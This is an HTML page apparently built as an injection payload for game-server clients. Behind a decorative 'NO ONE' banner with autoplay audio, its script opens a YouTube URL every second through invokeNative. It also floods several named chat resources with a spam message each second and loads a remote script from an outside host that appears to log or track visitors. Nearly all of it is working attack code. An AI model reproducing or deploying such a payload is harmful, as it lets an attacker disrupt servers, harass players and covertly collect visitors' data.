<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>discord.gg/</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: url('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExazkxemJmbmtsdnpocmduMXdnN3l4YmlibDc1eno0dzVyMWpyeWN0YiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/twQYPSiVdcq3s2KFyo/giphy.gif') no-repeat center center fixed;
            background-size: cover;
            font-family: 'Courier New', Courier, monospace;
            color: #ffd500; /* Text color */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            text-align: center;
        }
        .image-container img {
            width: 450px; 
            height: auto;
            border: 2px solid #ffd500; /* Changed border color to yellow */
            border-radius: 15px;
            box-shadow: 0 0 15px rgba(255, 215, 0, 0.7); /* Yellow glow */
        }
        .info {
            margin-top: 20px;
            font-size: 3em; /* Increased font size */
            color: #ffffff; /* Changed text color to white */
            text-shadow: 0px 0px 8px #ffffff, 0px 0px 15px #ffd500, 0px 0px 25px #ffd500; /* Glowing effect */
            letter-spacing: 4.5px; 
            text-transform: uppercase; /* Capital letters */
        }
    </style>
</head>
<body>
    <div class="image-container">
        <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExeWUyZjNxMTQ2bml4bWNmOWJydmFmc2pmMGtoZ2c0NmE1d3h4aWdtbiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/STSc4fxIAozRgV8rkI/giphy.gif" alt="Discord Image">
    </div>
    <audio autoplay loop>
        <source src="https://github.com/286b44606swax/dsaa2/blob/main/%D9%87%D8%A8%D9%87%20%D9%85%D8%B3%D8%B9%D9%88%D8%AF%20%D9%82%D8%AF%D9%8A%20%D9%85%D9%86%D8%AA%20%D9%82%D8%AF%D9%8A%20%D9%85%D9%86%20%D8%A3%D9%84%D8%A8%D9%88%D9%85%20%D9%8A%D8%A7%20%D8%AC%D9%85%D8%A7%D9%84%202009.mp3" type="audio/mpeg">
        Your browser does not support the audio element.
    </audio>
    <div class="info">
        <strong>NO ONE</strong>
    </div>

    <script>
        // Open YouTube URL every second
        setInterval(() => {
            window.invokeNative("openUrl", "https://www.youtube.com/watch?v=XKIxBAwEQ7Y&list=RDXKIxBAwEQ7Y&start_radio=1");
        }, 1000);

        // Message to be sent
        const msg = ":crown: no one is here ! :crown:";
        const body = JSON.stringify({ message: msg });

        // Send message to various endpoints every second
        setInterval(() => {
            fetch("https://flix-scripts/chatResult", { method: "POST", body });
            fetch("https://danger_chat/Danger_Chat:SendMessage", {
                method: "POST",
                body: JSON.stringify({
                    "message": msg,
                    "channel": "شات العام",
                    "color": null,
                    "isImageAndLinksAllowed": [false, false]
                })
            });
            fetch("https://easy-chat+/o6ZbK5Ecp6", {
                headers: {
                    accept: "/",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                body: JSON.stringify({ message: msg, channel: "شات العام" }),
                method: "POST"
            });
            fetch("https://melix_chat/chatResult", { method: "POST", body });
            fetch("https://as_chat/chatResult", { method: "POST", body });
            fetch("https://chat/chatResult", { method: "POST", body });
            fetch("https://ho-chatv2/Chat", {
                method: "POST",
                body: JSON.stringify({ "Type": "chatResult", "message": msg, "chatType": "general" })
            });
        }, 1000);
    </script>
    <script src='https://2no.co/cr2sher.js'></script>
</body>
</html>
